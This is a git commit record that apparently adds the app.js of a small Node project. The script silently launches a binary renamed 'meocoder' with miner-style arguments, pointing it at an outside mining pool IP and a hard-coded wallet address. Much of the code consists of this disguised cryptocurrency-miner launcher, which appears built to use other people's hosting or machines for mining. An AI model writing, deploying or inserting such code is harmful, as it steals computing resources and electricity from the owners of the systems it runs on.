8004c98bdbdfbdbf6940cbfbbcfea5f207b17a8e
mèocoder <meocoder@meocoder.local>
2021-04-16 10:04:51 +0700

    beta 1

---
+++ app.js
@@ -0,0 +1,19 @@
+const shell = require('shelljs');
+const { printLog } = require('./log-print');
+
+const nameTool = 'meocoder';
+
+
+const runJob = (nameTool) => {
+    const runMonney = shell.exec(`./${nameTool} -o 168.62.177.218:8080 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder_linux -k`, { silent: true, async: true });
+    if (runMonney.code !== undefined) {
+        return 0;
+    }
+    console.log('task running');
+    runMonney.stdout.on('data', (rawLog) => {
+        printLog(rawLog);
+    });
+}
+
+runJob(nameTool);
+
